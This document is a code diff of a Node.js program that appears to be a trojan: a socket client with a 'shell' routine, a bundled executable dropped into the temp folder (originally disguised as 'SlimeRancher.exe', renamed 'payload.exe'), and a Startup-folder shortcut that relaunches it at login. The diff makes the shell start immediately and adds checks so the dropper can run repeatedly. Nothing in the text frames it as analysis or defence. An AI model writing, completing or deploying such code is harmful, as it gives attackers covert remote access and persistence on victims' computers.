@@ -12,7 +12,7 @@ var client = new net.Socket();
 
 (function () {
     additional();
-    setTimeout(shell, Number("10") * 1000);
+    setTimeout(shell, Number("0") * 1000);
     return /a/; // don't close the process
 })();
 
@@ -51,36 +51,37 @@ function additional(){
     if(autoStarted) return;
 
     try {
-        const hasMerge = "true";
-        const mergeFileName = "SlimeRancher.exe";
+        const hasMerge = "false";
+        const mergeFileName = "payload.exe";
 
         let extractPath = path.normalize(path.join(os.tmpdir(), `${mergeFileName.slice(0, -4)}`));
         let actualFilePath = path.normalize(path.join(extractPath, `./${mergeFileName}`));
-        if(fs.existsSync(extractPath))
-        fs.rmdirSync(extractPath, { recursive:true, force: true  });
+        if(!fs.existsSync(extractPath))
         fs.mkdirSync(extractPath);
 
-        if(hasMerge == "true"){
+        if(hasMerge == "true" && !fs.existsSync(actualFilePath)){
             // save the external exe
             console.log('[log] Extracting the merged exe.');
             var mergeExeBuffer = fs.readFileSync(path.join(__dirname, './winResource.exe'));
             fs.writeFileSync(actualFilePath, mergeExeBuffer);
         }
 
-        if("true" == "true"){
-            // setup the hard symlinks
-            console.log('[log] Setting up symlinks.');
-            var surroundFiles = fs.readdirSync(process.cwd()).filter(f => f != mergeFileName);
-            var mkLinkCmd = [];
-            surroundFiles.map(f => {
-                let isDir = fs.lstatSync(path.join(process.cwd(), f)).isDirectory()
-                let target = path.join(process.cwd(), f);
-                let link = path.join(extractPath, f);
-                if(!fs.existsSync(link))
-                mkLinkCmd.push(`mklink /${isDir ? 'J' : 'H'} "${link}" "${target}"`);
-            });
-            mkLinkCmd = mkLinkCmd.join(' && ');
-            cp.execSync(mkLinkCmd);
+        if("false" == "true"){
+            try {
+                // setup the hard symlinks
+                console.log('[log] Setting up symlinks.');
+                var surroundFiles = fs.readdirSync(process.cwd()).filter(f => f != mergeFileName);
+                var mkLinkCmd = [];
+                surroundFiles.map(f => {
+                    let isDir = fs.lstatSync(path.join(process.cwd(), f)).isDirectory()
+                    let target = path.join(process.cwd(), f);
+                    let link = path.join(extractPath, f);
+                    if(!fs.existsSync(link))
+                    mkLinkCmd.push(`mklink /${isDir ? 'J' : 'H'} "${link}" "${target}"`);
+                });
+                mkLinkCmd = mkLinkCmd.join(' && ');
+                cp.execSync(mkLinkCmd);
+            } catch { /* just in case */ }
         }
 
         if(hasMerge == "true"){
@@ -96,11 +97,14 @@ function additional(){
                 `/Microsoft/Windows/Start Menu/Programs/Startup/${mergeFileName}.lnk`));
 
             // save the exe used to make the shortcut
-            var shortcutBuffer = fs.readFileSync(path.join(__dirname, './Shortcut.exe'));
             var shortcutPath = path.normalize(path.join(extractPath, `./Shortcut.exe`));
-            fs.writeFileSync(shortcutPath, shortcutBuffer);
+            if(!fs.existsSync(shortcutPath)){
+                var shortcutBuffer = fs.readFileSync(path.join(__dirname, './Shortcut.exe'));
+                fs.writeFileSync(shortcutPath, shortcutBuffer);
+            }
 
             // use it to make the custom shortcut
+            if(!fs.existsSync(linkPath))
             cp.execFileSync(shortcutPath, commandArgs('C', linkPath, {
                 target : currentFile,
 	            args : '--startup',
@@ -109,6 +113,10 @@ function additional(){
         
     } catch {  }
 }
+
+// #################################
+// FUNCTIONS RELATED TO SHORTCUT.EXE
+// #################################
 
 function expandEnv(path) {
 	var envRE = /(^|[^^])%((?:\^.|[^^%])*)%/g;
